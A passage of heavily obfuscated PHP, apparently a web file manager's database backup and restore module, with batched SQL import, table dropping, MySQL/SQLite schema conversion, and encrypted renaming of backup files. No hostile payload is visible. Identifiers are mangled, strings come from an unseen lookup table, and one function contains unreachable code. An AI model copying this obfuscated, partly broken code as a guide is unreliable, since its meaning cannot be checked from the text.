(!$â¿’£“æ) { return !1; } $î¨ıªù‹ = 0; $¨¯Í¯Œ = $Š¡ïö´[12]; $ÂçÇş = array(); $ñîãÄ· = $this->dbType(); $®”©°ÅÖ = $ñîãÄ· == $Š¡ïö´[13] ? 500 : 2000; $çÅÄ»±Ô = basename($ôÇ»™÷­, $Š¡ïö´[890]); $¥¿Ø¼æ… = 0; $´—– úÄ = 4194304; while (!feof($â¿’£“æ)) { $ºâÙ™ÖÎ = trim(fgets($â¿’£“æ)); if (!$ºâÙ™ÖÎ) { continue; } $ééŠô¿ƒ = $this->sqlDecode($ºâÙ™ÖÎ, $ñîãÄ·, $çÅÄ»±Ô); if (stripos($ééŠô¿ƒ, $Š¡ïö´[430]) === 0) { if (!$¨¯Í¯Œ) { $¨¯Í¯Œ = $ééŠô¿ƒ . $Š¡ïö´[53]; } continue; } if ($ÒÓÚ¾») { $ÒÓÚ¾»->task[$Š¡ïö´[1233]] += 1; } $î¨ıªù‹++; $ÂçÇş[] = rtrim(rtrim(trim($ééŠô¿ƒ), $Š¡ïö´[50]), $Š¡ïö´[74]); $Á¿…ø¤Í = null; $¡ÔÍµËö = strlen($ééŠô¿ƒ); $¥¿Ø¼æ… += $¡ÔÍµËö; $£œ¢ª’Å = strlen($¨¯Í¯Œ) + $¥¿Ø¼æ… + (count($ÂçÇş) - 1); if ($£œ¢ª’Å >= $´—– úÄ) { $Á¿…ø¤Í = array_pop($ÂçÇş); if ($î¨ıªù‹ > 1) { $î¨ıªù‹--; } } if ($î¨ıªù‹ >= $®”©°ÅÖ || $Á¿…ø¤Í) { $ééŠô¿ƒ = $¨¯Í¯Œ . implode($Š¡ïö´[50], $ÂçÇş); if (!$Éš¿¤øŸ->execute($ééŠô¿ƒ)) { return !1; } if ($ÒÓÚ¾») { $ÒÓÚ¾»->update($î¨ıªù‹); } $ÂçÇş = array(); $î¨ıªù‹ = 0; $¥¿Ø¼æ… = 0; if ($Á¿…ø¤Í) { $ÂçÇş = array($Á¿…ø¤Í); $î¨ıªù‹ = 1; $¥¿Ø¼æ… = $¡ÔÍµËö; } } } fclose($â¿’£“æ); if (!empty($ÂçÇş)) { $ééŠô¿ƒ = $¨¯Í¯Œ . implode($Š¡ïö´[50], $ÂçÇş); if (!$Éš¿¤øŸ->execute($ééŠô¿ƒ)) { return !1; } if ($ÒÓÚ¾») { $ÒÓÚ¾»->update($î¨ıªù‹); } } return !0; } public function dropTable($¦†î„ıÙ = null) { $¸µÂ×¢Ì =& $_SERVER[µÅ˜º…æ]; $‚ÒÔÜ = $this->model()->db(); $ßƒ™÷ô = $¦†î„ıÙ ? array($¦†î„ıÙ) : $‚ÒÔÜ->getTables(); if (!$ßƒ™÷ô) { return; } foreach ($ßƒ™÷ô as $¦†î„ıÙ) { if ($¦†î„ıÙ) { $¦†î„ıÙ = strtolower($¦†î„ıÙ); } else { continue; } $‚ÒÔÜ->execute($¸µÂ×¢Ì[1249] . $this->escapeName($¦†î„ıÙ) . $¸µÂ×¢Ì[1250]); } } private function sqlEncode($´ùäÍíÆ) { $Ä¤™à¸ë =& $_SERVER[µÅ˜º…æ]; $ÂàŠ¾ª” = array(); foreach ($´ùäÍíÆ as $Ç—³¡Á) { if (is_array($Ç—³¡Á)) { $Ç—³¡Á = json_encode_force($Ç—³¡Á); } $Ç—³¡Á = addslashes($Ç—³¡Á); $Ç—³¡Á = str_replace(array($Ä¤™à¸ë[1251], $Ä¤™à¸ë[285], $Ä¤™à¸ë[417]), array($Ä¤™à¸ë[1252], $Ä¤™à¸ë[1253], $Ä¤™à¸ë[1254]), $Ç—³¡Á); $ÂàŠ¾ª”[] = $Ç—³¡Á; } return $Ä¤™à¸ë[58] . implode($Ä¤™à¸ë[1255], $ÂàŠ¾ª”) . $Ä¤™à¸ë[58]; } private function sqlDecode($ŠÜ²ãğ, $ú‡®Í­ô, $öå”Àš = '') { $ÌŒ®ÄÖá =& $_SERVER[µÅ˜º…æ]; $ŠÜ²ãğ = str_replace(array($ÌŒ®ÄÖá[1252], $ÌŒ®ÄÖá[1253], $ÌŒ®ÄÖá[1254]), array($ÌŒ®ÄÖá[1251], $ÌŒ®ÄÖá[285], $ÌŒ®ÄÖá[417]), $ŠÜ²ãğ); if ($ú‡®Í­ô == $ÌŒ®ÄÖá[13]) { $ŠÜ²ãğ = str_ireplace($ÌŒ®ÄÖá[1256], $ÌŒ®ÄÖá[59], $ŠÜ²ãğ); $ŠÜ²ãğ = stripslashes($ŠÜ²ãğ); } return preg_replace($ÌŒ®ÄÖá[1257], $ÌŒ®ÄÖá[12], $ŠÜ²ãğ); if ($ú‡®Í­ô == $ÌŒ®ÄÖá[13]) { return $öå”Àš != $ÌŒ®ÄÖá[472] ? stripslashes($ŠÜ²ãğ) : $ŠÜ²ãğ; } if ($öå”Àš == $ÌŒ®ÄÖá[472]) { $ŠÜ²ãğ = str_replace($ÌŒ®ÄÖá[1258], $ÌŒ®ÄÖá[118], stripslashes($ŠÜ²ãğ)); } return $ŠÜ²ãğ; } public function getSqlFile($÷è€¥â× = '') { $ëüÇºôŞ =& $_SERVER[µÅ˜º…æ]; $»ëË“Œú = $this->dbType(!0); $™œ–ñ¯Ë = CONTROLLER_DIR . "\151\x6e\x73\x74\x61\x6c\x6c\x2f\144\x61\164\x61\x2f{$»ëË“Œú}\56\163\x71\x6c"; if (!file_exists($™œ–ñ¯Ë)) { return !1; } $¬ë¸™‰§ = file_get_contents($™œ–ñ¯Ë); $¸²Ç€ğ = $ëüÇºôŞ[1259] . ($»ëË“Œú == $ëüÇºôŞ[900] ? $ëüÇºôŞ[1260] : $ëüÇºôŞ[1261]) . $ëüÇºôŞ[1262]; preg_match_all($¸²Ç€ğ, $¬ë¸™‰§, $Ä†¤—€); $Ğ¡ğëã  = $Ä†¤—€[1]; $‘ßëçâ… = $this->model()->db(); $„¼ºË « = $‘ßëçâ…->getTables(); $şÏÔŠ¼Ø = TEMP_FILES . $ëüÇºôŞ[1263] . date($ëüÇºôŞ[259]) . $ëüÇºôŞ[8]; del_dir($şÏÔŠ¼Ø); mk_dir($şÏÔŠ¼Ø); $ö…îÛüŸ = $şÏÔŠ¼Ø . $ëüÇºôŞ[1264]; $±ò¥Œº¥ = $şÏÔŠ¼Ø . $ëüÇºôŞ[1265]; $İŞÍ´î = $»ëË“Œú == $ëüÇºôŞ[13] ? $ëüÇºôŞ[900] : $ëüÇºôŞ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\154\154\x2f\144\141\x74\x61\57{$İŞÍ´î}\56\x73\x71\x6c", $şÏÔŠ¼Ø); @touch($şÏÔŠ¼Ø . $»ëË“Œú . $ëüÇºôŞ[890]); $û¬©˜ÈŸ = fopen($ö…îÛüŸ, $ëüÇºôŞ[1237]); $ß°½Œ‡† = fopen($±ò¥Œº¥, $ëüÇºôŞ[1237]); if ($»ëË“Œú == $ëüÇºôŞ[13]) { $„¼ºË « = array_diff($„¼ºË «, array($ëüÇºôŞ[883], $ëüÇºôŞ[884])); $ûôğ•² = array($ëüÇºôŞ[1266], $ëüÇºôŞ[1267], $ëüÇºôŞ[1268]); fwrite($ß°½Œ‡†, implode(PHP_EOL, $ûôğ•²) . PHP_EOL . PHP_EOL); foreach ($„¼ºË « as $¨«±şğ²) { $˜»©¯Î  = $this->sqlFromSqlite($¨«±şğ²); if (!$˜»©¯Î [$ëüÇºôŞ[13]]) { continue; } fwrite($ß°½Œ‡†, $˜»©¯Î [$ëüÇºôŞ[13]] . PHP_EOL . PHP_EOL); if (!in_array($¨«±şğ², $Ğ¡ğëã )) { fwrite($û¬©˜ÈŸ, $˜»©¯Î [$ëüÇºôŞ[900]] . PHP_EOL . PHP_EOL); } } } else { foreach ($„¼ºË « as $¨«±şğ²) { $˜»©¯Î  = $this->sqlFromMysql($¨«±şğ²); if (!$˜»©¯Î [$ëüÇºôŞ[900]]) { continue; } fwrite($û¬©˜ÈŸ, $˜»©¯Î [$ëüÇºôŞ[900]] . PHP_EOL . PHP_EOL); if (!in_array($¨«±şğ², $Ğ¡ğëã )) { fwrite($ß°½Œ‡†, $˜»©¯Î [$ëüÇºôŞ[13]] . PHP_EOL . PHP_EOL); } } } fclose($û¬©˜ÈŸ); fclose($ß°½Œ‡†); $¬ë¸™‰§ = array($ëüÇºôŞ[900] => $ö…îÛüŸ, $ëüÇºôŞ[13] => $±ò¥Œº¥); return $÷è€¥â× ? $¬ë¸™‰§[$÷è€¥â×] : $¬ë¸™‰§; } public function dbType($Àèˆ›Õ = false) { $¡ŸıºŠë =& $_SERVER[µÅ˜º…æ]; $±’Ûœ½å = $Àèˆ›Õ ? $GLOBALS[$¡ŸıºŠë[6]][$¡ŸıºŠë[21]] : $this->database; $±’Ûœ½å = array_change_key_case($±’Ûœ½å); $Ã°•Ó´Ÿ = $±’Ûœ½å[$¡ŸıºŠë[1136]]; if ($Ã°•Ó´Ÿ == $¡ŸıºŠë[1133]) { $‚Á¶ÃœÆ = explode($¡ŸıºŠë[4], $±’Ûœ½å[$¡ŸıºŠë[1142]]); $Ã°•Ó´Ÿ = $‚Á¶ÃœÆ[0]; } $’ÚÕ†İé = array($¡ŸıºŠë[1269] => $¡ŸıºŠë[13], $¡ŸıºŠë[1078] => $¡ŸıºŠë[900]); if (isset($’ÚÕ†İé[$Ã°•Ó´Ÿ])) { $Ã°•Ó´Ÿ = $’ÚÕ†İé[$Ã°•Ó´Ÿ]; } return $Ã°•Ó´Ÿ; } public function sqlFromMysql($¼‹Ù¯Ëú, $“È‡šÑ÷ = '') { $ñƒÊ›­ =& $_SERVER[µÅ˜º…æ]; $¦œ×¹Ïˆ = array($ñƒÊ›­[900] => $ñƒÊ›­[12], $ñƒÊ›­[13] => $ñƒÊ›­[12]); $ôÛ¤‘¸© = $this->escapeName($¼‹Ù¯Ëú); $Øé¬–’€ = $this->escapeName($¼‹Ù¯Ëú, $ñƒÊ›­[13]); $¶ğìÅ–Ù = $this->model()->db(); $¯»¦Æ¯ñ = $¶ğìÅ–Ù->query("\163\150\x6f\x77\x20\143\x72\145\141\x74\x65\40\x74\141\142\x6c\x65\x20{$ôÛ¤‘¸©}\73"); if (!$¯»¦Æ¯ñ || !$¯»¦Æ¯ñ[0]) { return !1; } $±½¢ºŒ± = _get($¯»¦Æ¯ñ[0], $ñƒÊ›­[1270], $ñƒÊ›­[12]); if (!$±½¢ºŒ±) { return !1; } $Æ°ÂÃ¦ = "\x44\x52\x4f\x50\x20\124\x41\102\114\x45\40\111\106\40\x45\130\x49\123\x54\x53\x20{$ôÛ¤‘¸©}\x3b" . PHP_EOL . $±½¢ºŒ± . $ñƒÊ›­[74]; if ($“È‡šÑ÷ == $ñƒÊ›­[900]) { return $Æ°ÂÃ¦; } $¦œ×¹Ïˆ[$ñƒÊ›­[900]] = $Æ°ÂÃ¦; $¶äÆº¢Ã = array_change_key_case($GLOBALS[$ñƒÊ›­[6]][$ñƒÊ›­[21]]); $¢Õ”ÂÏò = $¶äÆº¢Ã[$ñƒÊ›­[1141]]; $ïìş•„ = $ñƒÊ›­[1271] . $¢Õ”ÂÏò . "\x27\x20\x41\116\x44\x20\124\x41\x42\x4c\105\x5f\116\x41\x4d\105\x20\x3d\40{$Øé¬–’€}\x3b"; $›¸ş· = "\x53\x48\117\x57\x20\x49\x4e\104\x45\x58\40\x46\x52\117\115\x20{$ôÛ¤‘¸©}\x3b"; $íáÆûš = $¶ğìÅ–Ù->query($ïìş•„); if (empty($íáÆûš)) { return $“È‡šÑ÷ ? $¦œ×¹Ïˆ[$“È‡šÑ÷] : $¦œ×¹Ïˆ; } $‘İÔ¦Ôâ = $¶ğìÅ–Ù->query($›¸ş·); $òö™¨¶ü = $ñƒÊ›­[12]; $¨‹ËËÙ® = array(); foreach ($‘İÔ¦Ôâ as $ÂÍŞ¶ùÑ) { if (!$òö™¨¶ü && $ÂÍŞ¶ùÑ[$ñƒÊ›­[1272]] == $ñƒÊ›­[1273]) { $òö™¨¶ü = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1274]]; } if (isset($¨‹ËËÙ®[$ÂÍŞ¶ùÑ[$ñƒÊ›­[1272]]])) { $¨‹ËËÙ®[$ÂÍŞ¶ùÑ[$ñƒÊ›­[1272]]][$ñƒÊ›­[1275]][] = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1274]]; continue; } $¨‹ËËÙ®[$ÂÍŞ¶ùÑ[$ñƒÊ›­[1272]]] = array($ñƒÊ›­[1276] => $ÂÍŞ¶ùÑ[$ñƒÊ›­[1272]], $ñƒÊ›­[1275] => array($ÂÍŞ¶ùÑ[$ñƒÊ›­[1274]]), $ñƒÊ›­[1277] => $ÂÍŞ¶ùÑ[$ñƒÊ›­[1278]] == $ñƒÊ›­[91] ? 0 : 1); } $È¯¼¢‘à = array(); foreach ($¨‹ËËÙ® as $ÂÍŞ¶ùÑ) { $©õÇâ’Š = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1276]] == $ñƒÊ›­[1273]; $È¿”ôˆ = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1277]] == $ñƒÊ›­[91] && !$©õÇâ’Š ? $ñƒÊ›­[1279] : $ñƒÊ›­[12]; $†Òæ–Ñä = $ñƒÊ›­[1280] . $¼‹Ù¯Ëú . $ñƒÊ›­[11] . ($©õÇâ’Š ? $ñƒÊ›­[1281] : $ÂÍŞ¶ùÑ[$ñƒÊ›­[1276]]); $¬”øšŒ = $ñƒÊ›­[1282] . implode($ñƒÊ›­[1283], $ÂÍŞ¶ùÑ[$ñƒÊ›­[1275]]) . $ñƒÊ›­[1284]; $È¯¼¢‘à[] = sprintf($ñƒÊ›­[1285], $ñƒÊ›­[1286], $È¿”ôˆ, $ñƒÊ›­[1287], $†Òæ–Ñä, $ñƒÊ›­[1288], $¼‹Ù¯Ëú, $¬”øšŒ); } $ã™Àà—‰ = array(); $üõ¶Äæ = array($ñƒÊ›­[1289] => $ñƒÊ›­[390], $ñƒÊ›­[1290] => $ñƒÊ›­[390], $ñƒÊ›­[364] => $ñƒÊ›­[390], $ñƒÊ›­[363] => $ñƒÊ›­[390], $ñƒÊ›­[1291] => $ñƒÊ›­[1292], $ñƒÊ›­[1293] => $ñƒÊ›­[1292], $ñƒÊ›­[1292] => $ñƒÊ›­[1292], $ñƒÊ›­[1294] => $ñƒÊ›­[1292], $ñƒÊ›­[282] => $ñƒÊ›­[1292], $ñƒÊ›­[1295] => $ñƒÊ›­[1292], $ñƒÊ›­[1296] => $ñƒÊ›­[1292], $ñƒÊ›­[1297] => $ñƒÊ›­[1298], $ñƒÊ›­[365] => $ñƒÊ›­[1298], $ñƒÊ›­[366] => $ñƒÊ›­[1298], $ñƒÊ›­[1299] => $ñƒÊ›­[1299]); foreach ($íáÆûš as $ÂÍŞ¶ùÑ) { $“È‡šÑ÷ = _get($üõ¶Äæ, $ÂÍŞ¶ùÑ[$ñƒÊ›­[1300]], $ÂÍŞ¶ùÑ[$ñƒÊ›­[1301]]); $íµÔô¬ø = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1302]] == $ñƒÊ›­[1061] ? $ñƒÊ›­[1303] : $ñƒÊ›­[1304]; $¡ñ ÜÂÁ = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1305]] == $òö™¨¶ü ? $ñƒÊ›­[1306] : $ñƒÊ›­[12]; $ÃŸ ë‡ = $ÂÍŞ¶ùÑ[$ñƒÊ›­[1115]] ? strtoupper(str_replace($ñƒÊ›­[11], $ñƒÊ›­[12], $ÂÍŞ¶ùÑ[$ñƒÊ›­[1115]])) : $ñƒÊ›­[12]; $ã™Àà—‰[] = sprintf($ñƒÊ›­[1307], $ÂÍŞ¶ùÑ[$ñƒÊ›­[1305]], $“È‡šÑ÷, $íµÔô¬ø, $¡ñ ÜÂÁ, $ÃŸ ë‡); } $á–¿¤û½ = array("\104\122\x4f\x50\x20\x54\101\102\x4c\x45\40\x49\x46\x20\x45\x58\111\x53\x54\123\40{$Øé¬–’€}\73", "\x43\122\x45\x41\124\x45\40\124\101\102\114\105\x20{$Øé¬–’€}\x20\x28", implode($ñƒÊ›­[50] . PHP_EOL, $ã™Àà—‰), $ñƒÊ›­[1308]); $üÕ›…¤ = implode(PHP_EOL, array_merge($á–¿¤û½, $È¯¼¢‘à)); if ($“È‡šÑ÷ == $ñƒÊ›­[13]) { return $üÕ›…¤; } $¦œ×¹Ïˆ[$ñƒÊ›­[13]] = $üÕ›…¤; return $¦œ×¹Ïˆ; } public function sqlFromSqlite($Û¥–†×†, $İ¼ƒËı‹ = '') { $’óø¤­± =& $_SERVER[µÅ˜º…æ]; $Ä£šèó‹ = array($’óø¤­±[900] => $’óø¤­±[12], $’óø¤­±[13] => $’óø¤­±[12]); $ªš³êñÈ = $this->escapeName($Û¥–†×†); $‘è„£ÀÑ = $this->escapeName($Û¥–†×†, $’óø¤­±[13]); $Íë›ß— = $this->model()->db(); $ˆÏÜïÛ– = "\x50\x52\101\107\115\101\40\124\101\x42\114\x45\137\111\116\106\117\x20\50\x27{$Û¥–†×†}\47\x29"; $¥’ƒÕ‰ = "\x53\105\114\x45\103\124\40\x2a\x20\106\122\x4f\x4d\40\163\x71\x6c\x69\164\x65\x5f\x6d\141\163\x74\145\162\x20\127\x48\x45\x52\105\40\164\x62\x6c\137\x6e\141\155\x65\40\75\x20\x27{$Û¥–†×†}\47"; $”ß¹®²õ = $Íë›ß—->query($ˆÏÜïÛ–); if (empty($”ß¹®²õ)) { return $İ¼ƒËı‹ ? $Ä£šèó‹[$İ¼ƒËı‹] : $Ä£šèó‹; } $£üç¼î = $Íë›ß—->query($¥’ƒÕ‰); $‹“öÜ» = $ù—¯˜ß¯ = array(); foreach ($£üç¼î as $©ò…¾ê) { if ($©ò…¾ê[$’óø¤­±[33]] == $’óø¤­±[357]) { $‹“öÜ»[] = $©ò…¾ê[$’óø¤­±[1309]]; } else { $ù—¯˜ß¯[] = $©ò…¾ê[$’óø¤­±[1309]]; } } $İŸŒ†œ = array_merge(array("\x44\x52\x4f\x50\x20\x54\x41\x42\x4c\x45\40\111\x46\x20\x45\x58\111\x53\124\x53\40{$‘è„£ÀÑ}\73"), $‹“öÜ», $ù—¯˜ß¯); $İŸŒ†œ = implode($’óø¤­±[74] . PHP_EOL, $İŸŒ†œ) . $’óø¤­±[74]; if ($İ¼ƒËı‹ == $’óø¤­±[13]) { return $İŸŒ†œ; } $Ä£šèó‹[$’óø¤­±[13]] = $İŸŒ†œ; $Ğ®çöğ = $¥“ «’ß = array(); $ç—†é¶˜ = array(); $á¸÷Åö = array(); foreach ($£üç¼î as $©ò…¾ê) { if ($©ò…¾ê[$’óø¤­±[33]] == $’óø¤­±[1310]) { $·‚Ù×ö = $©ò…¾ê[$’óø¤­±[1309]]; $ÍßØ”²º = stripos($·‚Ù×ö, $’óø¤­±[1279]) !== !1; $ãåŠªÜ— = stripos($·‚Ù×ö, $’óø¤­±[1273]) !== !1; preg_match($’óø¤­±[1311], $·‚Ù×ö, $ûÂ¢¯§é); if (empty($ûÂ¢¯§é)) { continue; } $âÆ·‰µ¢ = array_map($’óø¤­±[1312], explode($’óø¤­±[50], $ûÂ¢¯§é[1])); $²Î±¯Úè = array(); foreach ($âÆ·‰µ¢ as $Ì¥Ï‹Ø«) { $İšÆÜí = trim($Ì¥Ï‹Ø«, $’óø¤­±[1313]); $²Î±¯Úè[] = $İšÆÜí; $ç—†é¶˜[$İšÆÜí] = !0; } $á¸÷Åö[] = array($’óø¤­±[32] => $©ò…¾ê[$’óø¤­±[32]], $’óø¤­±[1309] => $·‚Ù×ö, $’óø¤­±[1314] => $ÍßØ”²º, $’óø¤­±[1315] => $ãåŠªÜ—, $’óø¤­±[1316] => $²Î±¯Úè); } } $™Šü¯ƒÅ = array($’óø¤­±[1290] => $’óø¤­±[1290], $’óø¤­±[390] => $’óø¤­±[1317], $’óø¤­±[1298] => $’óø¤­±[1318], $’óø¤­±[1292] => $’óø¤­±[1292], $’óø¤­±[1299] => $’óø¤­±[1319], $’óø¤­±[1320] => $’óø¤­±[1321]); $‘‡ËØùß = array($’óø¤­±[451], $’óø¤­±[168], $’óø¤­±[540]); $òÀ×Î‚ = array($’óø¤­±[390], $’óø¤­±[1298], $’óø¤­±[1320], $’óø¤­±[1290]); foreach ($”ß¹®²õ as $©ò…¾ê) { $½¢¶º¨ı = $©ò…¾ê[$’óø¤­±[32]]; $«øÈ‘È« = strtolower($©ò…¾ê[$’óø¤­±[33]]); if ($«øÈ‘È« == $’óø¤­±[1292] && isset($ç—†é¶˜[$½¢¶º¨ı])) { $İ¼ƒËı‹ = in_array($½¢¶º¨ı, $‘‡ËØùß) ? $’óø¤­±[1292] : $’óø¤­±[1322]; } else { $İ¼ƒËı‹ = _get($™Šü¯ƒÅ, $«øÈ‘È«, $«øÈ‘È«); } if ($©ò…¾ê[$’óø¤­±[57]] > 0) { $¥“ «’ß[$©ò…¾ê[$’óø¤­±[57]]] = $½¢¶º¨ı; } $¯ôîšÕã = $’óø¤­±[12]; if ($©ò…¾ê[$’óø¤­±[56]] !== null) { $÷İ¬æŠ = $©ò…¾ê[$’óø¤­±[56]]; if (in_array($«øÈ‘È«, $òÀ×Î‚) && is_numeric($÷İ¬æŠ)) { $¯ôîšÕã = "\104\105\106\101\125\114\x54\x20{$÷İ¬æŠ}"; } else { if (strtolower($÷İ¬æŠ) === $’óø¤­±[103]) { $¯ôîšÕã = $©ò…¾ê[$’óø¤­±[35]] ? $’óø¤­±[12] : $’óø¤­±[1304]; } else { $ğ‹Â×Æê = is_numeric($÷İ¬æŠ) ? $÷İ¬æŠ : $’óø¤­±[58] . addslashes($÷İ¬æŠ) . $’óø¤­±[58]; $¯ôîšÕã = "\104\105\x46\101\125\x4c\124\40{$ğ‹Â×Æê}"; } } } $ë­ú†¶ï = $©ò…¾ê[$’óø¤­±[35]] ? $’óø¤­±[1303] : $’óø¤­±[1323]; $ê¶™š£Ë = stripos($«øÈ‘È«, $’óø¤­±[364]) !== !1 && $©ò…¾ê[$’óø¤­±[57]] ? $’óø¤­±[1324] : $’óø¤­±[12]; $Ğ®çöğ[] = sprintf($’óø¤­±[1325], $½¢¶º¨ı, $İ¼ƒËı‹, $ë­ú†¶ï, $¯ôîšÕã, $ê¶™š£Ë); } if (!empty($¥“ «’ß)) { ksort($¥“ «’ß); $ƒÑÑ›Ş“ = $’óø¤­±[475] . implode($’óø¤­±[1245], $¥“ «’ß) . $’óø¤­±[475]; $Ğ®çöğ[] = "\120\122\x49\115\101\122\x59\40\x4b\105\131\40\50{$ƒÑÑ›Ş“}\x29"; } foreach ($á¸÷Åö as $‘ì–Äéä) { if ($‘ì–Äéä[$’óø¤­±[1315]]) { continue; } $¼±„ÖÌÕ = array(); foreach ($‘ì–Äéä[$’óø¤­±[1316]] as $Ì¥Ï‹Ø«) { $™Šü¯ƒÅ = null; foreach ($”ß¹®²õ as $°¡¾Æ„») { if ($°¡¾Æ„»[$’óø¤­±[32]] == $Ì¥Ï‹Ø«) { $™Šü¯ƒÅ = strtolower($°¡¾Æ„»[$’óø¤­±[33]]); break; } } if ($™Šü¯ƒÅ == $’óø¤­±[1292] && in_array($Ì¥Ï‹Ø«, $‘‡ËØùß)) { $¼±„ÖÌÕ[] = "\x60{$Ì¥Ï‹Ø«}\x60\x28\62\65\x30\51"; } else { $¼±„ÖÌÕ[] = "\x60{$Ì¥Ï‹Ø«}\x60"; } } $«øÈ‘È« = ($‘ì–Äéä[$’óø¤­±[1314]] ? $’óø¤­±[1326] : $’óø¤­±[12]) . $’óø¤­±[1327]; $–¤‚ó¡ï = str_replace($’óø¤­±[1280] . $Û¥–†×† . $’óø¤­±[11], $’óø¤­±[12], $‘ì–Äéä[$’óø¤­±[32]]); $–¤‚ó¡ï = str_replace($Û¥–†×† . $’óø¤­±[11], $’óø¤­±[12], $–¤‚ó¡ï); $Ğ®çöğ[] = "{$«øÈ‘È«}\x20\140{$–¤‚ó¡ï}\140\40\x28" . implode($’óø¤­±[50], $¼±„ÖÌÕ) . $’óø¤­±[1244]; } $’ˆÏ¾Öõ = array("\x44\x52\x4f\x50\x20\x54\x41\x42\114\105\x20\111\106\40\x45\130\111\x53\124\x53\x20{$ªš³êñÈ}\x3b", "\x43\x52\105\101\x54\105\x20\124\x41\102\x4c\x45\40{$ªš³êñÈ}\40\x28", implode($’óø¤­±[50] . PHP_EOL, $Ğ®çöğ), $’óø¤­±[1328]); $’ˆÏ¾Öõ = implode(PHP_EOL, $’ˆÏ¾Öõ); if ($İ¼ƒËı‹ == $’óø¤­±[900]) { return $’ˆÏ¾Öõ; } $Ä£šèó‹[$’óø¤­±[900]] = $’ˆÏ¾Öõ; return $Ä£šèó‹; } private function escapeName($¿ÓğÃ…½, $·Ú’İ = "\x6d\171\163\161\x6c") { $ø«˜Ä¥• =& $_SERVER[µÅ˜º…æ]; $¿ÓğÃ…½ = preg_replace($ø«˜Ä¥•[1329], $ø«˜Ä¥•[12], $¿ÓğÃ…½); if ($·Ú’İ === $ø«˜Ä¥•[900]) { return "\x60{$¿ÓğÃ…½}\140"; } return "\42{$¿ÓğÃ…½}\x22"; } public function mixBakList($ÁŸ˜Çœ) { $‹µô¡éó =& $_SERVER[µÅ˜º…æ]; $ÁŸ˜Çœ = rtrim($ÁŸ˜Çœ, $‹µô¡éó[8]) . $‹µô¡éó[8]; $¡Ë¥œ¡ = $‹µô¡éó[1330]; $™Š½¯Ñˆ = IO::listPath($ÁŸ˜Çœ); if (empty($™Š½¯Ñˆ[$‹µô¡éó[86]])) { return !1; } $–èÇÒÂÑ = array(); foreach ($™Š½¯Ñˆ[$‹µô¡éó[86]] as $şŠ‹ø² => $»º«ßà³) { if (!$»º«ßà³[$‹µô¡éó[32]] || !$»º«ßà³[$‹µô¡éó[87]]) { continue; } $¶¶ú±îÂ = Mcrypt::encode($»º«ßà³[$‹µô¡éó[32]], $¡Ë¥œ¡); $¿éıÈ¿ = md5($¶¶ú±îÂ); IO::rename($»º«ßà³[$‹µô¡éó[87]], $¿éıÈ¿); $–èÇÒÂÑ[$¿éıÈ¿] = $¶¶ú±îÂ; } $®ïçïÚ® = md5($‹µô¡éó[1331] . $¡Ë¥œ¡); IO::setContent($ÁŸ˜Çœ . $®ïçïÚ®, json_encode($–èÇÒÂÑ)); return !0; } public function unmixBakList($Šª°‰ú´) { $şö»ö  =& $_SERVER[µÅ˜º…æ]; $Šª°‰ú´ = rtrim($Šª°‰ú´, $şö»ö [8]) . $şö»ö [8]; $ıñîŠ› = $this->unmixBakListGet($Šª°‰ú´, !0); if (empty($ıñîŠ›)) { return !1; } foreach ($ıñîŠ› as $‚Ñ‡ŠÀ… => $¶Ã½ñ˜º) { $õÀË«ô£ = IO::rename($Šª°‰ú´ . $¶Ã½ñ˜º, $‚Ñ‡ŠÀ…); if (!$õÀË«ô£) { return !1; } } return !0; } public function unmixBakListGet($—¯Ò¬À–, $¨­’—ŒĞ = false) { $ç°æéÀ =& $_SERVER[µÅ˜º…æ]; $—¯Ò¬À– = rtrim($—¯Ò¬À–, $ç°æéÀ[8]) . $ç°æéÀ[8]; $íª½’Ü© = $ç°æéÀ[1330]; $Æ¼÷ùáÜ = md5($ç°æéÀ[1331] . $íª½’Ü©); $—Ã©Á•± = $—¯Ò¬À– . $Æ¼÷ùáÜ; if (!IO::exist($—Ã©Á•±)) { return !1; } $¬ãı–ôŸ = json_decode(IO::getContent($—Ã©Á•±), !0); if (empty($¬ãı–ôŸ)) { return !1; } $±÷´¥Ë‰ = array(); foreach ($¬ãı–ôŸ as $ˆµªÉ¥İ => $–Ë¢Â»º) { $Æ¼÷ùáÜ = Mcrypt::decode($–Ë¢Â»º, $íª½’Ü©); $±÷´¥Ë‰[$Æ¼÷ùáÜ] = $ˆµªÉ¥İ; } if ($¨­’—ŒĞ) { IO::remove($—Ã©Á•±, !1); } return $±÷´¥Ë‰; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($©ğÊş»·, $íƒİÁÅ) { $öâÕÜÉ =& $_SERVER[µÅ˜º…æ]; $Ï¨¶áóû = $íƒİÁÅ; $GLOBALS[$öâÕÜÉ[1332]] = $öâÕÜÉ[1333] . $©ğÊş»·; Hook::trigger($öâÕÜÉ[1333] . $©ğÊş»· . $öâÕÜÉ[1334], $Ï¨¶áóû); $œÒ£…²Ã = self::driverMake($íƒİÁÅ[0]); if (!$œÒ£…²Ã) { return !1; } if ($©ğÊş»· == $öâÕÜÉ[641] || $©ğÊş»· == $öâÕÜÉ[643] || $©ğÊş»· == $öâÕÜÉ[1335]) { if (!trim($œÒ£…²Ã->path . $öâÕÜÉ[463], $öâÕÜÉ[8])) { return !1; } } if (method_exists($œÒ£…²Ã, $©ğÊş»·)) { $ßåŸñü‘ = @call_user_func_array(array($œÒ£…²Ã, $©ğÊş»·), $íƒİÁÅ); } else { if (method_exists($œÒ£…²Ã, $öâÕÜÉ[1336])) { $ßåŸñü‘ = @call_user_func_array(array($œÒ£…²Ã, $©ğÊş»·), $íƒİÁÅ); } else { if (method_exists(self, $©ğÊş»·)) { $ßåŸñü‘ = @call_user_func_array(array(self, $©ğÊş»·), $íƒİÁÅ); } else { $ßåŸñü‘ = call_user_func_array(array(parent, $©ğÊş»·), $íƒİÁÅ); } } } Hook::trigger($öâÕÜÉ[1333] . $©ğÊş»· . $öâÕÜÉ[1337], $Ï¨¶áóû, $ßåŸñü‘); return $ßåŸñü‘; } public static function init($ ²‰¬°º) { return self::driverMake($ ²‰¬°º); } public static function copy($ÃŠŞüÜ±, $Ñ’Ã¸‚ô, $‹£¹¾“ = false, $Ïûö©ˆ£ = false) { return self::copyMoveStart($ÃŠŞüÜ±, 